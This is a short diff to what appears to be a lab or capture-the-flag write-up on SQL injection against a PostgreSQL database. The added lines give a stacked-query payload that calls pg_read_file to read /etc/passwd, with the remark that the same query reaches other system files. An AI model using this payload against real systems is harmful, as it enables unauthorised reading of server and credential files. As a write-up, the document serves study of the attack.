@@ -241,3 +241,11 @@ I can get the path of the config file, using this i should be able to get its ou
 
 I can get the contents of the file
 
+Using this same query i should be able to access other files on the system too
+
+```python
+''; SELECT pg_read_file('/etc/passwd', 0, 2000);
+```
+
+![](Pasted%20image%2020260907191041.png)
+
